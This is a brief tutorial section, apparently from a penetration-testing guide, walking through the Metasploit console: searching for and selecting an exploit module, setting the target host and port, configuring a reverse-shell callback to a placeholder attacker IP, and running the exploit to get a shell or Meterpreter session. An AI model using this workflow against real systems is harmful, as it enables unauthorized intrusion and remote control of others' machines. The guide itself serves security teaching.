## Metasploit

Metasploit provides a framework for selecting exploits, configuring payloads, and interacting with compromised systems.

A basic workflow looks like:

```bash
msfconsole
```

Search for an exploit:

```bash
search <service-or-vulnerability>
```

Select it:

```bash
use <module>
```

Check the required options:

```bash
show options
```

Configure the target:

```bash
set RHOSTS <TARGET_IP>
set RPORT <TARGET_PORT>
```

Configure the callback information when using a reverse shell:

```bash
set LHOST <ATTACKER_IP>
set LPORT 4444
```

Then run the exploit:

```bash
run
```

or:

```bash
exploit
```

Depending on the payload, a successful exploit may provide a standard shell or a Meterpreter session.

